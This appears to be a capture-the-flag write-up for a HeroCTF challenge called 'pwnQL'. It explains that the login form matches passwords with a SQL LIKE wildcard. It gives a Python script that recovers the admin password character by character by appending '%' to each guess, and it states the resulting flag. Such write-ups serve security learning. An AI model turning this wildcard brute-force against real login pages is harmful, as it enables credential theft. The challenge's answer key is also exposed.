
In the second round of ``pwnQL``, we were asked to get the admin's password for flag. As we already known the server was checking password fuzzly, we generate passwords end with *%* to find out character at each position. The passwords are generated from printable characters exclude '%'. The length was set to 6 by guess, turned out it was 10.

Here is the brute-force process.

```python
candidates = string.printable[:66] + string.printable[67:]

def guess():
    user = "admin"
    pw = []
    url = "http://chall1.heroctf.fr:8080/index.php"
    for i in range(10):
        for a in candidates:
            pw.append(a)
            rsp = requests.post(url, data={
                "username": user,
                "password": ''.join(pw) + '%',},
                headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                },)

            if not "Wrong username or password" in rsp.text:
                print(pw)
                break
            pw = pw[:len(pw)-1]
            time.sleep(1)

    print('password:', ''.join(pw))

guess()
```

After minutes running, the password came out, it was *s3cur3p@ss*, so the flag was *Hero{s3cur3p@ss}*.
